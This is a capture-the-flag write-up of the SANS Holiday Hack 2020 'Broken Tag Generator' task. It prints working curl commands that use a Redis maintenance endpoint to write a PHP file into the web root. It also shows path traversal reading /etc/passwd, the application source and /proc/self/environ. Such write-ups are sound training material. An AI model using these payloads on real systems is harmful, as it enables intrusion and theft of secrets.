# Writeup for SANS Holiday Hack Challenge 2020 - 'Zat You, Santa Claus? featuring KringleCon 3: French Hens
# 8. Broken Tag Generator
## 8.0. Description
Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.
## 8.1. Side Challenge - Redis Bug Hunt
This challenge revolves around an issue in redis maintenance mode allowing to create arbitrary files and potentially leading to RCE with the target of obtaining the source code of the application.  
I leveraged the feature to create a new php file which included the content of the actual `index.php` one:
```bash
player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=config,set,dir,%2Fvar%2Fwww%2Fhtml%2f"
Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html/'
OK
player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=config,set,dbfilename,index2.php"
Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'index2.php'
OK
player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%0A%24homepage%20%3D%20file_get_contents%28%27index.php%27%29%3B%0Aecho%20%24homepage%3B%0A%3F%3E"
OK
Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php
$homepage = file_get_contents('\''index.php'\'');
echo $homepage;
?>'

OK
player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=save"
Running: redis-cli --raw -a '<password censored>' 'save'

OK
player@1be6e6576403:~$ curl http://localhost/index2.php --output -
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�+��_used-mem¨
 aof-preamble��� test@D<?php

# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
# 

echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
?>
example1The site is in maintenance modeexample2#We think there's a bug in index.php��Pƫ��ڪ
```

## 8.2. Hints
> **Endpoint Exploration** - Holly Evergreen: *“Is there an endpoint that will print arbitrary files?”*  
> **Content-Type Gotcha** - Holly Evergreen: *“If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!”*  
> **Error Page Message Disclosure** - Holly Evergreen: *“Can you figure out the path to the script? It's probably on error pages!”*  
> **Download File Mechanism** - Holly Evergreen: *“Once you know the path to the file, we need a way to download it!”*  
> **Source Code Retrieval** - Holly Evergreen: *“We might be able to find the problem if we can get source code!”*  
> **Redirect to Download** - Holly Evergreen: *“If you find a way to execute code blindly, I bet you can redirect to a file then download that file!”*  
> **Patience and Timing** - Holly Evergreen: *“Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!”*  
> **Source Code Analysis** - Holly Evergreen: *“I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?”*  

## 8.3. Solution
Analyzing the JS source code I highlighted two interesting code lines: `img.attr('src', '/image?id=${id}'`); and `window.location = '/share?id=${res.id}'`;. Probing these URLs led to interesting results which made me have a pretty strong feeling of Path Traversal and how to exploit it. Further probing confirmed it thus I was able to obtain the source code of the application and the content of the `GREETZ` environment variable with value `JackFrostWasHere`.
```bash
thedead@dellian:~/Desktop/repos/KringleCon3-temp$ curl https://tag-generator.kringlecastle.com/image?id=test
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/test</p>
thedead@dellian:~/Desktop/repos/KringleCon3-temp$ curl https://tag-generator.kringlecastle.com/share?id=test
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Route not found</p>
thedead@dellian:~/Desktop/repos/KringleCon3-temp$ curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
app:x:1000:1000:,,,:/home/app:/bin/bash

thedead@dellian:~/Desktop/repos/KringleCon3-temp$ curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb --output tag-generator/app.rb
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4886  100  4886    0     0   3485      0  0:00:01  0:00:01 --:--:--  3485

thedead@dellian:~/Desktop/repos/KringleCon3-temp$ curl https://tag-generator.kringlecastle.com/image?id=../proc/self/environ --output tag-generator/environ
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   399  100   399    0     0    233      0  0:00:01  0:00:01 --:--:--   233
thedead@dellian:~/Desktop/repos/KringleCon3-temp$ cat tag-generator/environ 
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
```
## 8.4. Ciao Jack
Just wanted to say “[Hi](https://www.youtube.com/watch?v=0fz9-gqwThQ)!” 😁

---
# 9. ARP Shenanigans
# 10. Defeat Fingerprint Sensor
# 11a. Naughty/Nice List with Blockchain Investigation Part 1
# 11b. Naughty/Nice List with Blockchain Investigation Part 2

---
# 0. [thedead@asian:~$ whoami](../README.md)
# ?. 33.6 Kbps
# 1. Uncover Santa's Gift List
# 2. Investigate S3 Bucket
# 3. Point-of-Sale Password Recovery
# 4. Operate the Santavator
# 5. Open HID Lock
# 6. Splunk Challenge
# 7. Solve the Sleigh's CAN-D-BUS Problem